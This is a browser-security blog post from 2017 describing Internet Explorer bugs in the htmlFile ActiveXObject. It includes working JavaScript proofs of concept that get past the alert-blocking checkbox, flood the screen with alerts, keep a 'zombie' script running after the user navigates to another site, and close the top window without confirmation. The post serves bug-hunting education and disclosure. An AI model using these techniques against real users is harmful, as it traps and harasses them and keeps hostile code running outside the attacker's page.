<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="alternate icon" type="image/x-icon" href="/favicon.ico"><meta name="generator" content="Astro v5.16.6"><title>The Attack of the Alerts and the Zombie Script (IE)</title><meta name="description" content><link rel="canonical" href="https://www.brokenbrowser.com/blog/zombie-alert/"><meta property="og:title" content="The Attack of the Alerts and the Zombie Script (IE)"><meta property="og:description" content><meta property="og:type" content="website"><meta property="og:url" content="https://www.brokenbrowser.com/blog/zombie-alert/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="The Attack of the Alerts and the Zombie Script (IE)"><meta name="twitter:description" content><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.xml"><link rel="stylesheet" href="/_astro/_slug_.D8CnJWvD.css"></head> <body> <div class="container center"> <header class="header"> <div class="header__inner"> <div class="header__logo"> <a href="/"> <div class="logo">
MagicMac Labs
</div> </a> </div> <ul class="menu menu--mobile"> <li class="menu__trigger">Menu ▾</li> <li> <ul class="menu__dropdown"> <!--<li><a href={`${base}`}>Home</a></li>--> <li><a href="/browser-workshop/">Browser Workshop</a></li> <li><a href="/musings/">Musings</a></li> <li><a href="/about/">About</a></li> </ul> </li> </ul> </div> <nav class="navigation-menu"> <ul class="navigation-menu__inner menu--desktop"> <!--<li><a href={`${base}`}>Home</a></li>--> <li><a href="/browser-workshop/">Browser Workshop</a></li> <li><a href="/musings/">Musings</a></li> <li><a href="/about/">About</a></li> </ul> </nav> </header> <main class="content">  <article> <h1 class="post-title">The Attack of the Alerts and the Zombie Script (IE)</h1> <div class="post-meta"> <time> <time datetime="2017-02-20T00:00:00.000Z"> 2017-02-20 </time> </time> <span class="post-category"> :: browser-workshop</span>  </div>  <div class="post-content">  <p>In our previous post we found a way to <a href="../uxss-ie-htmlfile/">UXSS (bypass the SOP policy) using the htmlFile/ActiveXObject</a>, however, I mentioned that there were other interesting things to do using that same object. Have you tried anything? If yes, congratulations. The only way to find bugs is by trying, and today we are going to explore another interesting thing that can be done with the same ActiveXObject.</p>
<p>Have you noted recently that all browsers have a feature to block perpetual alerts? As soon as you execute a second alert it comes with a check-box to disable the following ones, just like this:</p>
<p><img src="/images/2017/02/01_alert_with_checkbox.png" alt="">
This gives us (bad programmers) the chance to exit never ending alert-loops, but more important, it allows the user to defend himself against malicious pages that literally block the interface with fake messages. Users have now the chance to block all the following alerts by checking that box, but with the ActiveX window object we can continue throwing infinite alerts with no way to escape them.</p>
<p>If you haven’t read the previous post about the <a href="../uxss-ie-htmlfile/">UXSS using htmlFile/ActiveXObject</a>, please do it now. It’s important to understand why we are using specific members of this htmlFile/ActiveX (like how to get its window object). Anyway, let’s use the alert method from the ActiveXObject which completely bypasses the preference of the user of “no more alerts please!”. We can throw infinite ones but for this demo we will do it with just three.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-foreground)">doc </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-keyword)"> new</span><span style="color:var(--astro-code-token-function)"> ActiveXObject</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"htmlFile"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">win </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> doc</span><span style="color:var(--astro-code-foreground)">.Script; </span><span style="color:var(--astro-code-token-comment)">// win is the window object of the ActiveXObject</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">win</span><span style="color:var(--astro-code-token-function)">.alert</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"Hello"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">win</span><span style="color:var(--astro-code-token-function)">.alert</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"2nd alert, no option to block me."</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">win</span><span style="color:var(--astro-code-token-function)">.alert</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"3rd alert, and still no way out!"</span><span style="color:var(--astro-code-foreground)">);</span></span></code></pre>
<p><img src="/images/2017/02/02_alert_without_checkbox.png" alt=""></p>
<p>Honestly, I’m not impressed at all. Yeah yeah, unlimited alerts but it’s no big deal considering that other security researchers are <a href="https://xlab.tencent.com/en/2015/12/09/bypass-dep-and-cfg-using-jit-compiler-in-chakra-engine/">bypassing DEP / CFG</a> and <a href="https://gsec.hitb.org/sg2016/sessions/look-mom-i-dont-use-shellcode-a-browser-exploitation-case-study-for-internet-explorer-11/">re-enabling the God Mode</a>. Let’s try something better. We will throw a few alerts but all visible at once, filling the entire screen with thousands them! No worries, in this PoC we will use just ten!</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">for</span><span style="color:var(--astro-code-foreground)"> (</span><span style="color:var(--astro-code-token-keyword)">var</span><span style="color:var(--astro-code-foreground)"> i </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 0</span><span style="color:var(--astro-code-foreground)">; i </span><span style="color:var(--astro-code-token-keyword)">&#x3C;</span><span style="color:var(--astro-code-token-constant)"> 10</span><span style="color:var(--astro-code-foreground)">; i</span><span style="color:var(--astro-code-token-keyword)">++</span><span style="color:var(--astro-code-foreground)">)</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">{</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">   doc </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-keyword)"> new</span><span style="color:var(--astro-code-token-function)"> ActiveXObject</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"htmlFile"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">   win </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> doc</span><span style="color:var(--astro-code-foreground)">.Script; </span><span style="color:var(--astro-code-token-comment)">// win is the window object of the ActiveXObject</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">   win</span><span style="color:var(--astro-code-token-function)">.setTimeout</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"alert('Hello, world!')"</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-foreground)"> i </span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-token-constant)"> 100</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">}</span></span></code></pre>
<p><img src="/images/2017/02/03_alert_ad_infinitum.png" alt=""></p>
<p>Wow! This is not impressive, but it will keep the user and those amazing researchers busy . Click click click :) . I know alerts are not interesting and let’s be honest, once the user has a chance to leave the page, he will be free from our horrible alerts, right? Wrong! We can be persistent and continue running our code <strong>even</strong> after he left our page. Imagine a user who goes to Google trying to escape from us, but continues to receive our alerts! Hehe :) Let’s do it, it’s not hard at all.</p>
<h2 id="persistent-code">Persistent Code</h2>
<p>In order to make our code persistent (or a <em>zombie script</em> as some people call it), we need to keep a reference to the object that runs the script and <strong>make a call the window.open method</strong>. Those two things will make IE think it should not destroy the object because there’s still a reference to it. The good thing is that the reference can be in the object itself!</p>
<ol>
<li>Save a reference to the ActiveXObject.</li>
<li>Use the window.open method.</li>
</ol>
<p>Just one more thing: keep in mind that using the window.open method <strong>does not mean</strong> that we need to literally open a window/tab. In fact, we will use a very simple/old trick which <em>apparently</em> does nothing: window.open into the same window with an empty URL.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-foreground)">doc </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-keyword)"> new</span><span style="color:var(--astro-code-token-function)"> ActiveXObject</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"htmlFile"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// Alert every 5 seconds</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">doc</span><span style="color:var(--astro-code-token-function)">.</span><span style="color:var(--astro-code-token-constant)">Script</span><span style="color:var(--astro-code-token-function)">.setInterval</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"alert('Hello, world!')"</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 5000</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// Save a self-reference</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">doc</span><span style="color:var(--astro-code-foreground)">.</span><span style="color:var(--astro-code-token-constant)">Script</span><span style="color:var(--astro-code-foreground)">.doc </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-foreground)"> doc;</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// Use the open method. Nothing changes here, but now IE will not</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// destroy the previous reference and the script will continue running.</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">""</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)">"_self"</span><span style="color:var(--astro-code-foreground)">); </span><span style="color:var(--astro-code-token-comment)">// "Does nothing", but this line is crucial.</span></span>
<span class="line"></span></code></pre>
<p>That’s it! Now the user can type anything in the address-bar, click on links or navigate as much as she wants, but our script will always be with her until the tab is closed. And by the way, everything here can be done straight from inside an iframe on a different domain, and still work (without bypassing SOP, of course).</p>
<p><img src="/images/2017/02/04_zombie_script-2.png" alt=""></p>
<p>Wow! This is amazing! The setInterval keeps running even after leaving our page! Navigate, try it by yourself! Is there a way to combine the <a href="../uxss-ie-htmlfile/">previous UXSS</a> with this bug and have UXSS everywhere? Can we know where **exactly **the user is or the URL in the address bar? <a href="https://www.youtube.com/watch?v=QJeiuDzCJjM">Check out this video</a> where I was just teasing <a href="https://twitter.com/ericlaw">Eric</a> because of a Twitter conversation that we were having.</p>
<p><strong>Tip:</strong> the window.open trick that we did is useful for other things too. For example, if we run it against the top window (not matter how deeply framed we are), then, IE thinks the main window was opened with scripting and it allows us to close it without confirmations, just like this:</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-foreground)">w </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">""</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)">"_top"</span><span style="color:var(--astro-code-foreground)">); </span><span style="color:var(--astro-code-token-comment)">// IE thinks the top was open with scripting</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">w</span><span style="color:var(--astro-code-token-function)">.close</span><span style="color:var(--astro-code-foreground)">();   </span><span style="color:var(--astro-code-token-comment)">// Now we can close it without confirmation</span></span></code></pre>
<p>Have a nice day full of passion, bug hunter!</p>
<p><a href="https://twitter.com/magicmac2000">Manuel</a></p> <div class="pagination"> <div class="pagination__title"> <span class="pagination__title-h">Read other posts</span> <hr> </div> <div class="pagination__buttons">  <a href="/blog/uxss-ie-htmlfile/" class="button inline prev">
&lt; [SOP bypass / UXSS htmlFile in IFrame (IE)]
</a> <span>::</span> <a href="/blog/bypass-the-patch-to-keep-spoofing-the-address-bar-with-the-malware-warning/" class="button inline next">
[Bypassing the patch to keep spoofing the Smartscreen/Malware warning (Edge)] &gt;
</a> </div> </div>  </div> </article> <script type="module">document.addEventListener("DOMContentLoaded",()=>{document.querySelectorAll("pre.astro-code").forEach(t=>{const n=document.createElement("div");n.className="highlight",t.parentNode?.insertBefore(n,t),n.appendChild(t);const a=t.getAttribute("data-language")||"text",o=document.createElement("div");if(o.className="code-title",o.textContent=a,navigator.clipboard){const e=document.createElement("button");e.className="copy-button",e.textContent="Copy",e.addEventListener("click",async()=>{const c=t.textContent||"";try{await navigator.clipboard.writeText(c),e.textContent="Copied",setTimeout(()=>{e.textContent="Copy"},1e3)}catch(r){console.error("Failed to copy:",r)}}),o.appendChild(e)}n.insertBefore(o,t)})});</script>  <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>  </main> <footer class="footer"> <div class="footer__inner"> <div class="copyright"> <span>© 2026 MagicMac Labs</span> </div> </div> </footer> </div> <script type="module">(()=>{const s=document.querySelector(".container"),o=document.querySelectorAll(".menu");document.body.addEventListener("click",()=>{o.forEach(e=>{e.classList.contains("open")&&e.classList.remove("open")})}),window.addEventListener("resize",()=>{o.forEach(e=>{e.classList.remove("open")})}),o.forEach(e=>{const i=e.querySelector(".menu__trigger"),t=e.querySelector(".menu__dropdown");i&&t&&(i.addEventListener("click",n=>{n.stopPropagation(),e.classList.contains("open")?e.classList.remove("open"):(o.forEach(c=>c.classList.remove("open")),e.classList.add("open")),s&&t.getBoundingClientRect().right>s.getBoundingClientRect().right&&(t.style.left="auto",t.style.right="0")}),t.addEventListener("click",n=>n.stopPropagation()))})})();</script> </body> </html> 